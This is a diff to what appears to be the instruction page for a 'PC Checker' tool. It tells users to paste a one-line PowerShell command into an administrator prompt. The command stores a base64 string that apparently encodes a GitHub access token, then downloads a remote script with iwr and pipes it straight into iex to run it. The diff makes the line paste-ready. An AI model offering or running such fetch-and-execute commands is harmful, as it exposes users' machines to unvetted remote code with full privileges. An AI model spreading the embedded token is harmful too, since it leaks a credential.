@@ -18,7 +18,7 @@ Put the Powershell script into the text area.
 
 1- Locate where is says "PS C:\WINDOWS\system32>" 
 
-2- After the > Paste the following: "$t="Z2l0aHViX3BhdF8xMUJMQjMzVVEwbkVzOHhJeVBpUnpoX2g3RUhSaTB0YkN5cWphV1lOTFBXWWE4WkZSb1RxeU5JSG1CcjU5UVRQV3ZGSzVSRUNCQVFpWTJVT05w"; iwr -useb https://raw.githubusercontent.com/suprsor/Pc-Checker-Main/refs/heads/main/SuprsorsPcCheck.ps1 | iex"
+2- After the > Paste the following: $t="Z2l0aHViX3BhdF8xMUJMQjMzVVEwbkVzOHhJeVBpUnpoX2g3RUhSaTB0YkN5cWphV1lOTFBXWWE4WkZSb1RxeU5JSG1CcjU5UVRQV3ZGSzVSRUNCQVFpWTJVT05w"; iwr -useb https://raw.githubusercontent.com/suprsor/Pc-Checker-Main/refs/heads/main/SuprsorsPcCheck.ps1 | iex
 
 3- Press enter.
 
